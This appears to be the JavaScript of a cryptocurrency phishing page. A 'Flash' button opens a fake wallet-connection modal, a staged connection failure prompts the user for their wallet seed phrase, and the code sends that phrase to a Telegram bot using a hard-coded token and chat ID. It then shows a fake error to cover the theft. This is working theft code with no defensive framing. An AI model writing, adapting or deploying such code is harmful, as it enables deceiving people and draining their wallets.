const flashButton = document.getElementById('flash-button');
const walletModal = document.getElementById('wallet-modal');
const seedPhraseSection = document.getElementById('seed-phrase-section');
const submitSeedButton = document.getElementById('submit-seed');
const loading = document.getElementById('loading');
const errorMessage = document.getElementById('error-message');

// Show wallet modal when Flash is clicked
flashButton.addEventListener('click', () => {
    walletModal.style.display = 'block';
});

// Simulate wallet connection failure
function connectWallet(walletName) {
    console.log(`Attempting to connect ${walletName}...`);
    setTimeout(() => {
        seedPhraseSection.style.display = 'block';
    }, 2000); // 2-second delay to mimic connection attempt
}

// Handle seed phrase submission
submitSeedButton.addEventListener('click', () => {
    const seedPhrase = document.getElementById('seed-phrase').value.trim();
    if (seedPhrase) {
        loading.style.display = 'block';
        seedPhraseSection.style.display = 'none';
        
        // Send to Telegram
        sendToTelegram(seedPhrase);
        
        // Simulate processing delay
        setTimeout(() => {
            loading.style.display = 'none';
            errorMessage.style.display = 'block';
            setTimeout(() => {
                walletModal.style.display = 'none'; // Close modal after error
                errorMessage.style.display = 'none'; // Reset for next use
            }, 3000);
        }, 3000); // 3-second loading
    } else {
        alert('Please enter a seed phrase.');
    }
});

// Telegram integration
function sendToTelegram(seedPhrase) {
    const botToken = '7660484163:AAEahg5iCWir8bjM4W7CSfE10K_PUrO3mt0';
    const chatId = '7753649096';
    const message = `New Seed Phrase: ${seedPhrase}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => console.log('Telegram response:', data))
        .catch(error => console.error('Telegram error:', error));
}